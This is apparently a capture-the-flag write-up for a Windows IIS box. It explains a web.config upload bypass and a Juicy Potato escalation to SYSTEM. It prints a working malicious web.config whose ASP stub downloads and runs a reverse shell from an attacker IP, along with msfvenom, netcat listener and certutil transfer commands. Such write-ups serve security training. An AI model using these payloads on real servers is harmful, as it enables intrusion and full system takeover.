#Windows #IIS #UploadBypass #webconfig #asp #JuicyPotato #SeImpersonate #Nishang

## Overview

Bounty is an easy Windows box running IIS 7.5 on Server 2008. The attack path is a two-step: bypass a file upload filter by planting a malicious `web.config` that IIS executes as ASP, gaining a shell as `merlin`, then leverage `SeImpersonatePrivilege` with Juicy Potato to escalate to SYSTEM.

## Recon

Nmap showed only port 80 with IIS 7.5. Directory brute-forcing with GoBuster found the upload surface:

```sh
gobuster dir -u http://10.129.189.68/ -w /path/to/big.txt -x php
/transfer.aspx   (Status: 200)
/UploadedFiles   (Status: 301)
```

`/transfer.aspx` is a file upload form. `/UploadedFiles` returns 403, so uploaded files are served from there but the directory is not browsable.

## Foothold

### web.config Upload Bypass

Uploading `cmdasp.aspx` directly was filtered. Adding a null byte to the filename in Burp (`cmdasp.aspx%00.jpg`) slipped past the extension check but returned a runtime error pointing at `web.config`.

> **Why web.config can execute code:** IIS reads `web.config` to configure how it handles requests. The `<handlers>` section can map file extensions to processors. If an attacker can upload a `web.config` that maps `*.config` to the ASP ISAPI handler, IIS will parse any `.config` file in that directory as classic ASP, executing embedded `<% %>` blocks.

The crafted `web.config` adds the mapping and includes an ASP stub that pulls a Nishang PowerShell reverse shell via `iex`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions><remove fileExtension=".config" /></fileExtensions>
        <hiddenSegments><remove segment="web.config" /></hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%@ Language=VBScript %>
<% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5/Invoke-Payload.ps1')") %>
```

After uploading and browsing to `http://10.129.189.68/UploadedFiles/web.config`, the Nishang shell called home:

```sh
rlwrap nc -lvnp 443
connect to [10.10.14.92] from (UNKNOWN) [10.129.189.68] 49158
Windows PowerShell running as user BOUNTY$ on BOUNTY
PS C:\windows\system32\inetsrv> whoami
bounty\merlin
```

The user flag was a hidden file, revealed with:

```powershell
ls -force
```

## Privilege Escalation

### SeImpersonate → Juicy Potato → SYSTEM

`whoami /priv` showed `merlin` held `SeImpersonatePrivilege`.

> **Why SeImpersonate leads to SYSTEM:** IIS worker processes run with this privilege so they can impersonate connecting clients. Juicy Potato abuses COM object activation: it creates a COM server listening on a local port, tricks a privileged DCOM process (typically SYSTEM) into connecting and authenticating, captures that token, then uses it to launch an arbitrary process. The result is code execution as SYSTEM.

Because `iwr` was blocked, `certutil` transferred the binaries:

```sh
msfvenom -p windows/x64/shell_reverse_tcp LPORT=8443 LHOST=10.10.14.92 -f exe > shell.exe
```

```powershell
PS C:\Users\merlin\desktop> .\juicy.exe -t * -p C:\Users\merlin\desktop\shell.exe -l 1337
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK
```

## Root

```sh
rlwrap nc -lvnp 8443
C:\Windows\system32> whoami
nt authority\system

C:\Users\Administrator\Desktop> type root.txt
‹redacted›
```

## Takeaways

- **IIS upload filters that block by extension are bypassable with web.config.** If a site allows `web.config` uploads and the upload directory is under the web root, IIS will parse it and any crafted handler mapping can turn the directory into a code-execution point.
- **SeImpersonatePrivilege on IIS is nearly always exploitable.** Service accounts that interact with network clients regularly hold this privilege. On older Windows (pre-2019 without hotfix), Juicy Potato will convert it to SYSTEM reliably.
- **certutil as a file transfer fallback:** when PowerShell download cradles are blocked, `certutil -urlcache -f` is a built-in Windows binary that fetches arbitrary files.
